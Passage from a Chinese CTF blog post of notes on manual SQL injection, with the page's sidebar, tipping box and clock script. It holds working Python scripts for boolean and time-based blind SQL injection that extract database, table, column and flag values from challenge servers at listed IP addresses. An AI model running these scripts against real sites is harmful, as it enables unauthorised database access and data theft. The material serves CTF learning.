+        except requests.exceptions.ReadTimeout as e:
+            flag+=chr(mid)
+            print(flag)
+            break
+        except Exception as e:
+            pass
+        else:
+            try:
+                r2=requests.post(url,data=data1,timeout=3,proxies=proxies)
+            except requests.exceptions.ReadTimeout as e:
+                low=mid+1
+            except Exception as e:
+                pass
+            else:
+                top=mid-1
+
+    if flag==f1:
+        break</code></pre>
+<h3 id="二分法盲注">二分法盲注</h3>
+<pre><code class="hljs plaintext">import requests
+
+url=&quot;http://116.63.149.36:50048/file_id.php?id=&quot;
+flag=&#x27;&#x27;
+for i in range(1,50):
+   f1=flag
+   top=127
+   low=33
+   while low&lt;=top:
+      mid=(top+low)//2
+      # data=&#123;&#x27;id&#x27;:&#x27;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&#x27;.format(str(i),str(mid))&#125;
+      # data1=&#123;&#x27;id&#x27;:&#x27;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,0)&#x27;.format(str(i),str(mid))&#125;
+      data=&#x27;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&#x27;.format(str(i),str(mid))
+      data1=&#x27;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,0)&#x27;.format(str(i),str(mid))
+      try:
+         r1=requests.post(url+data1)
+         print(i,mid)
+         if &#x27;glzjin&#x27; in r1.text:
+            flag+=chr(mid)
+            print(flag)
+            break
+         r=requests.post(url+data)
+         if &quot;Error&quot; in r.text:
+            top=mid-1
+         if &#x27;glzjin&#x27; in r.text:
+            low=mid+1
+      except Exception as e:
+         pass
+   if flag==f1:
+      break</code></pre>
+<h3 id="时间盲注">时间盲注</h3>
+<pre><code class="hljs plaintext">import requests
+
+url = &#x27;http://139.199.182.61/index.php?id=1%27&#x27;
+lendata=7
+# for i in range(1, 50):
+#    try:
+#       payload1 = &#x27;/**/and/**/if(length(database())=&#123;&#125;,sleep(3),1)%23&#x27;.format(i)
+#       r = requests.get(url + payload1, timeout=3)
+#    except requests.exceptions.ReadTimeout as e:
+#       lendata = i
+#       print(&quot;数据库长度为&quot;+str(i))
+#       break
+
+databases=[&#x27;easysql&#x27;]
+
+# database=&quot;&quot;
+# for j  in range(1,lendata+1):
+#    for k in range(33,127):
+#       payload2 = &#x27;/**/and/**/if(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;.format(j, k)
+#       print(payload2)
+#       try:
+#          r=requests.get(url+payload2,timeout=3)
+#       except requests.exceptions.ReadTimeout as e:
+#          database+=chr(k)
+#          print(database)
+#          break
+#       except Exception as w:
+#          pass
+
+# database=&#x27;&#x27;
+# databases=[]
+# for k in range(0, 10):
+#   flag1=len(databases)
+#    for i in range(1,50):
+#       flag=database
+#       for j in range(33,127):
+#          payload3=&#x27;/**/and/**/if(ascii(substr((selselectect/**/schema_name/**/from/**/information_schema.schemata/**/limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;.format(k , i, j)
+#          try:
+#             print(payload3)
+#             r=requests.get(url+payload3,timeout=3)
+#          except requests.exceptions.ReadTimeout as e:
+#             database+=chr(j)
+#             print(database)
+#             break
+#          except Exception as w:
+#             pass
+#       if flag==database:
+#          break
+#    databases.append(database)
+#   if flag1==len(databases):
+#      break
+# print(databases)
+
+
+tables=[&#x27;f1aggggggggggggg&#x27;]
+# table=&#x27;&#x27;
+# # tables=[&#x27;users&#x27;]
+# for k in range(0, 10):
+#    flag1=len(tables)
+#    for i in range(1,50):
+#       flag=table
+#       for j in range(33,127):
+#          payload3=&#x27;/**/and/**/if(ascii(substr((selselectect/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;.format(k , i, j)
+#          try:
+#             print(payload3)
+#             r=requests.get(url+payload3,timeout=3)
+#          except requests.exceptions.ReadTimeout as e:
+#             table+=chr(j)
+#             print(table)
+#             break
+#          except Exception as w:
+#             pass
+#       if flag==table:
+#          tables.append(table)
+#          table=&quot;&quot;
+#         break
+#    if len(tables)=flag1
+#   break
+# print(tables)
+
+columns=[&#x27;fl4444444g&#x27;]
+# column=&#x27;&#x27;
+# for te in tables:
+#    for k in range(0,5):
+#      flag1=len(columns)
+#       for i in range(1,50):
+#          flag=column
+#          for j in range(33,127):
+#             payload4=&#x27;/**/and/**/if(ascii(substr((seselectlect/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&quot;&#123;&#125;&quot; limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;.format(te,k,i,j)
+#             try:
+#                r=requests.get(url+payload4,timeout=3)
+#                print(payload4)
+#             except requests.exceptions.ReadTimeout as e:
+#                column+=chr(j)
+#                print(column)
+#                break
+#             except Exception as w:
+#                pass	
+#          if flag==column:
+#             columns.append(column)
+#             column=&#x27;&#x27;
+#             break
+#      if len(columns)=flag1:
+#         break;
+# print(columns)
+
+# data=&#x27;&#x27;
+
+# for db in databases:
+#    for ta in tables:
+#       for co in columns:
+#          for k in range(0,10):
+#             for i in range(1,50):
+#                flag=data
+#                for j in range(33,127):
+#                   payload5=&#x27;/**/and/**/if(ascii(substring((seselectlect/**/&#123;&#125;/**/from/**/&#123;&#125;.&#123;&#125;/**/limit/**/&#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)%23&#x27;.format(co,db,ta,k,i,j)
+#                   try:
+#                      r=requests.get(url+payload5,timeout=3)
+#                      print(payload5)
+#                   except requests.exceptions.ReadTimeout as e:
+#                      data+=chr(j)
+#                      print(data)
+#                      break
+#                   except Exception as w:
+#                      pass	
+#                if flag==data:
+#                   data=&#x27;&#x27;
+#                   brea</code></pre>
+<h3 id="其他">其他</h3>
+<pre><code class="hljs plaintext">import requests
+s=requests.session()
+url=&#x27;https://46a0f98e-cdc3-413d-b67c-b2dbaeb5c4ec.chall.ctf.show/index.php&#x27;
+table=&quot;&quot;
+
+for i in range(1,45):
+    print(i)
+    for j in range(31,128):
+        #爆表名  flag
+        payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))
+        #爆字段名 flag
+        #payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))
+        #读取flag
+        #payload = &quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;%(str(i), str(j))
+
+        ra = s.get(url=url + &#x27;?id=0/**/or/**/&#x27; + payload).text
+
+        if &#x27;I asked nothing&#x27; in ra:
+            table += chr(j)
+            print(table)
+            break</code></pre>
+<pre><code class="hljs plaintext">import requests
+url = &quot;http://124.156.121.112:28069/?id=-1&#x27;/**/&quot;
+def db(url):                    #爆库名
+    for i in range(1,5):
+        for j in range(32,128):
+            u= &quot;or/**/ascii(substr(database()/**/from/**/&quot;+str(i)+&quot;/**/for/**/1))=&quot;+str(j)+&quot;#&quot;
+            s = url+u
+            print(s)
+            r =  requests.get(s)
+            if &#x27;By Rudyard Kipling&#x27; in r.text:
+                print(chr(j))
+                
+def table(url):                    #爆表名
+    for i in range(4):
+        table_name=&#x27;&#x27;
+        for j in range(1,6):
+            for k in range(48,128):
+                u=id=&quot;||/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/1/**/offset/**/&quot;+str(i)+&quot;)/**/from/**/&quot;+str(j)+&quot;/**/for/**/1))=&quot;+str(k)+&quot;#&quot;
+                s = url+u
+                print(s)
+                r =  requests.get(s)            
+                if &#x27;By Rudyard Kipling&#x27; in r.text:
+                    table_name+=chr(k)
+            print(table_name)</code></pre>
+<h2 id="参考">参考</h2>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45089570/article/details/108932892">sql注入常用脚本_sql脚本注入_西部壮仔的博客-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ZWDXiTN1hglO-T9osvUWnA">微信公众平台 (qq.com)</a></p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>制作不易，如若感觉写的不错，欢迎打赏</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechat.jpg" alt="故里 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/zhifubao.jpg" alt="故里 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>故里
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://hzy2003628.top/2023/08/07/SQL%E6%89%8B%E6%B3%A8%E5%B0%8F%E8%AE%B0/" title="SQL手注小记">https://hzy2003628.top/2023/08/07/SQL手注小记/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/SQL/" rel="tag"><i class="fa fa-tag"></i> SQL</a>
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+          </div>
+
+        
+
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/07/22/2023BDSecCTF/" rel="prev" title="BDSecCTF2023">
+      <i class="fa fa-chevron-left"></i> BDSecCTF2023
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+
+
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-mysql-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">0x01 Mysql 手工注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#11-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 联合注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.3.</span> <span class="nav-text">1.3 盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#131-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.3.1.</span> <span class="nav-text">1.3.1 时间盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#132-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.3.2.</span> <span class="nav-text">1.3.2 布尔盲注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#14-insertdeleteupdate"><span class="nav-number">1.4.</span> <span class="nav-text">1.4 insert,delete,update</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#141-%E6%8A%A5%E9%94%99"><span class="nav-number">1.4.1.</span> <span class="nav-text">1.4.1 报错</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#142-%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.4.2.</span> <span class="nav-text">1.4.2 盲注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#15-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E4%B8%8E%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">1.5.</span> <span class="nav-text">1.5 二次注入与宽字节注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-oracle-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">0x02 Oracle 手工注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#21-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 联合注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#22-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#23-%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#231-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.3.1.</span> <span class="nav-text">2.3.1 布尔盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#232-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.3.2.</span> <span class="nav-text">2.3.2 时间盲注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">2.4.</span> <span class="nav-text"></span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-sql-server-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">0x03 SQL server 手工注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#31-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">3.1.</span> <span class="nav-text">3.1 联合注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#32-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">3.2.</span> <span class="nav-text">3.2 报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#33-%E7%9B%B2%E6%B3%A8"><span class="nav-number">3.3.</span> <span class="nav-text">3.3 盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#331-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">3.3.1.</span> <span class="nav-text">3.3.1 布尔盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#332-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">3.3.2.</span> <span class="nav-text">3.3.2 时间盲注</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E7%9A%84%E8%84%9A%E6%9C%AC"><span class="nav-number">4.</span> <span class="nav-text">0x04 SQL注入常用的脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xff%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E4%BA%8C%E5%88%86%E6%B3%95"><span class="nav-number">4.1.</span> <span class="nav-text">XFF时间盲注二分法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E5%88%86%E6%B3%95%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.2.</span> <span class="nav-text">二分法时间盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E5%88%86%E6%B3%95%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.3.</span> <span class="nav-text">二分法盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.4.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">4.5.</span> <span class="nav-text">其他</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="故里"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">故里</p>
+  <div class="site-description" itemprop="description">没有所谓失败，除非你不再尝试</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">101</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">37</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:2596328958@qq.com" title="E-Mail → mailto:2596328958@qq.com" rel="noopener" target="_blank"><i class="envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+	  
+
+	     <!-- canvas粒子时钟 -->
+        
+        <div id="">
+  <canvas id="canvas" style="width:60%;">
+</div>
+<script async>
+(function(){
+  var WINDOW_WIDTH = 820;
+  		var WINDOW_HEIGHT = 250;
+  		var RADIUS = 7; //球半径
+  		var NUMBER_GAP = 10; //数字之间的间隙
+  		var u=0.65; //碰撞能量损耗系数
+  		var context; //Canvas绘制上下文
+  		var balls = []; //存储彩色的小球
+  		const colors = ["#33B5E5","#0099CC","#AA66CC","#9933CC","#99CC00","#669900","#FFBB33","#FF8800","#FF4444","#CC0000"]; //彩色小球的颜色
+  		var currentNums = []; //屏幕显示的8个字符
+  		var digit =
+                  [
+                      [
+                          [0,0,1,1,1,0,0],
+                          [0,1,1,0,1,1,0],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [0,1,1,0,1,1,0],
+                          [0,0,1,1,1,0,0]
+                      ],//0
+                      [
+                          [0,0,0,1,1,0,0],
+                          [0,1,1,1,1,0,0],
+                          [0,0,0,1,1,0,0],
+                          [0,0,0,1,1,0,0],
+                          [0,0,0,1,1,0,0],
+                          [0,0,0,1,1,0,0],
+                          [0,0,0,1,1,0,0],
+                          [0,0,0,1,1,0,0],
+                          [0,0,0,1,1,0,0],
+                          [1,1,1,1,1,1,1]
+                      ],//1
+                      [
+                          [0,1,1,1,1,1,0],
+                          [1,1,0,0,0,1,1],
+                          [0,0,0,0,0,1,1],
+                          [0,0,0,0,1,1,0],
+                          [0,0,0,1,1,0,0],
+                          [0,0,1,1,0,0,0],
+                          [0,1,1,0,0,0,0],
+                          [1,1,0,0,0,0,0],
+                          [1,1,0,0,0,1,1],
+                          [1,1,1,1,1,1,1]
+                      ],//2
+                      [
+                          [1,1,1,1,1,1,1],
+                          [0,0,0,0,0,1,1],
+                          [0,0,0,0,1,1,0],
+                          [0,0,0,1,1,0,0],
+                          [0,0,1,1,1,0,0],
+                          [0,0,0,0,1,1,0],
+                          [0,0,0,0,0,1,1],
+                          [0,0,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [0,1,1,1,1,1,0]
+                      ],//3
+                      [
+                          [0,0,0,0,1,1,0],
+                          [0,0,0,1,1,1,0],
+                          [0,0,1,1,1,1,0],
+                          [0,1,1,0,1,1,0],
+                          [1,1,0,0,1,1,0],
+                          [1,1,1,1,1,1,1],
+                          [0,0,0,0,1,1,0],
+                          [0,0,0,0,1,1,0],
+                          [0,0,0,0,1,1,0],
+                          [0,0,0,1,1,1,1]
+                      ],//4
+                      [
+                          [1,1,1,1,1,1,1],
+                          [1,1,0,0,0,0,0],
+                          [1,1,0,0,0,0,0],
+                          [1,1,1,1,1,1,0],
+                          [0,0,0,0,0,1,1],
+                          [0,0,0,0,0,1,1],
+                          [0,0,0,0,0,1,1],
+                          [0,0,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [0,1,1,1,1,1,0]
+                      ],//5
+                      [
+                          [0,0,0,0,1,1,0],
+                          [0,0,1,1,0,0,0],
+                          [0,1,1,0,0,0,0],
+                          [1,1,0,0,0,0,0],
+                          [1,1,0,1,1,1,0],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [0,1,1,1,1,1,0]
+                      ],//6
+                      [
+                          [1,1,1,1,1,1,1],
+                          [1,1,0,0,0,1,1],
+                          [0,0,0,0,1,1,0],
+                          [0,0,0,0,1,1,0],
+                          [0,0,0,1,1,0,0],
+                          [0,0,0,1,1,0,0],
+                          [0,0,1,1,0,0,0],
+                          [0,0,1,1,0,0,0],
+                          [0,0,1,1,0,0,0],
+                          [0,0,1,1,0,0,0]
+                      ],//7
+                      [
+                          [0,1,1,1,1,1,0],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [0,1,1,1,1,1,0],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [0,1,1,1,1,1,0]
+                      ],//8
+                      [
+                          [0,1,1,1,1,1,0],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [1,1,0,0,0,1,1],
+                          [0,1,1,1,0,1,1],
+                          [0,0,0,0,0,1,1],
+                          [0,0,0,0,0,1,1],
+                          [0,0,0,0,1,1,0],
+                          [0,0,0,1,1,0,0],
+                          [0,1,1,0,0,0,0]
+                      ],//9
+                      [
+                          [0,0,0,0],
+                          [0,0,0,0],
+                          [0,1,1,0],
+                          [0,1,1,0],
+                          [0,0,0,0],
+                          [0,0,0,0],
+                          [0,1,1,0],
+                          [0,1,1,0],
+                          [0,0,0,0],
+                          [0,0,0,0]
+                      ]//:
+                  ];
+
+  		function drawDatetime(cxt){
+  			var nums = [];
+
+  			context.fillStyle="#005eac"
+  			var date = new Date();
+  			var offsetX = 70, offsetY = 30;
+  			var hours = date.getHours();
+  			var num1 = Math.floor(hours/10);
+  			var num2 = hours%10;
+  			nums.push({num: num1});
+  			nums.push({num: num2});
+  			nums.push({num: 10}); //冒号
+  			var minutes = date.getMinutes();
+  			var num1 = Math.floor(minutes/10);
+  			var num2 = minutes%10;
+  			nums.push({num: num1});
+  			nums.push({num: num2});
+  			nums.push({num: 10}); //冒号
+  			var seconds = date.getSeconds();
+  			var num1 = Math.floor(seconds/10);
+  			var num2 = seconds%10;
+  			nums.push({num: num1});
+  			nums.push({num: num2});
+
+  			for(var x = 0;x<nums.length;x++){
+  				nums[x].offsetX = offsetX;
+  				offsetX = drawSingleNumber(offsetX,offsetY, nums[x].num,cxt);
+  				//两个数字连一块，应该间隔一些距离
+  				if(x<nums.length-1){
+  					if((nums[x].num!=10) &&(nums[x+1].num!=10)){
+  						offsetX+=NUMBER_GAP;
+  					}
+  				}
+  			}
+
+  			//说明这是初始化
+  			if(currentNums.length ==0){
+  				currentNums = nums;
+  			}else{
+  				//进行比较
+  				for(var index = 0;index<currentNums.length;index++){
+  					if(currentNums[index].num!=nums[index].num){
+  						//不一样时，添加彩色小球
+  						addBalls(nums[index]);
+  						currentNums[index].num=nums[index].num;
+  					}
+  				}
+  			}
+  			renderBalls(cxt);
+  			updateBalls();
+
+  			return date;
+  		}
+
+  		function addBalls (item) {
+  			var num = item.num;
+  			var numMatrix = digit[num];
+  			for(var y = 0;y<numMatrix.length;y++){
+  				for(var x = 0;x<numMatrix[y].length;x++){
+  					if(numMatrix[y][x]==1){
+  						var ball={
+  							offsetX:item.offsetX+RADIUS+RADIUS*2*x,
+  							offsetY:30+RADIUS+RADIUS*2*y,
+  							color:colors[Math.floor(Math.random()*colors.length)],
+  							g:1.5+Math.random(),
+  							vx:Math.pow(-1, Math.ceil(Math.random()*10))*4+Math.random(),
+  							vy:-5
+  						}
+  						balls.push(ball);
+  					}
+  				}
+  			}
+  		}
+
+  		function renderBalls(cxt){
+  			for(var index = 0;index<balls.length;index++){
+  				cxt.beginPath();
+  				cxt.fillStyle=balls[index].color;
+  				cxt.arc(balls[index].offsetX, balls[index].offsetY, RADIUS, 0, 2*Math.PI);
+  				cxt.fill();
+  			}
+  		}
+
+  		function updateBalls () {
+  			var i =0;
+  			for(var index = 0;index<balls.length;index++){
+  				var ball = balls[index];
+  				ball.offsetX += ball.vx;
+  				ball.offsetY += ball.vy;
+  				ball.vy+=ball.g;
+  				if(ball.offsetY > (WINDOW_HEIGHT-RADIUS)){
+  					ball.offsetY= WINDOW_HEIGHT-RADIUS;
+  					ball.vy=-ball.vy*u;
+  				}
+  				if(ball.offsetX>RADIUS&&ball.offsetX<(WINDOW_WIDTH-RADIUS)){
+
+  					balls[i]=balls[index];
+  					i++;
+  				}
+  			}
+  			//去除出边界的球
+  			for(;i<balls.length;i++){
+  				balls.pop();
+  			}
+  		}
+  		function drawSingleNumber(offsetX, offsetY, num, cxt){
+  			var numMatrix = digit[num];
+  			for(var y = 0;y<numMatrix.length;y++){
+  				for(var x = 0;x<numMatrix[y].length;x++){
+  					if(numMatrix[y][x]==1){
+  						cxt.beginPath();
+  						cxt.arc(offsetX+RADIUS+RADIUS*2*x,offsetY+RADIUS+RADIUS*2*y,RADIUS,0,2*Math.PI);
+  						cxt.fill();
+  					}
+  				}
+  			}
+  			cxt.beginPath();
+  			offsetX += numMatrix[0].length*RADIUS*2;
+  			return offsetX;
+  		}
+
+  		var canvas = document.getElementById("canvas");
+  		canvas.width=WINDOW_WIDTH;
+  		canvas.height=WINDOW_HEIGHT;
+  		context = canvas.getContext("2d");
+
+  		//记录当前绘制的时刻
+  		var currentDate = new Date();
+
+  		setInterval(function(){
+  			//清空整个Canvas，重新绘制内容
+  			context.clearRect(0, 0, context.canvas.width, context.canvas.height);
+  			drawDatetime(context);
+  		}, 50)
+})();
+</script>
+
+
+      
+
+
+<!--添加标签云-->
+        
+          <script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
+          <script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
+          <div class="widget-wrap">
+            <div>标签云</div>
+            <div id="myCanvasContainer" class="widget tagcloud">
+              <canvas width="250" height="250" id="resCanvas" style="width=100%">
+              <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">68</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP%E5%A4%B4%E9%83%A8%E4%BF%A1%E6%81%AF%E5%88%86%E6%9E%90/" rel="tag">HTTP头部信息分析</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="tag">PHP伪协议</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP%E7%89%B9%E6%80%A7/" rel="tag">PHP特性</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RE/" rel="tag">RE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL/" rel="tag">SQL</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a><span class="tag-list-count">14</span></li><li class="tag-list-item"><a class="tag-list-link" 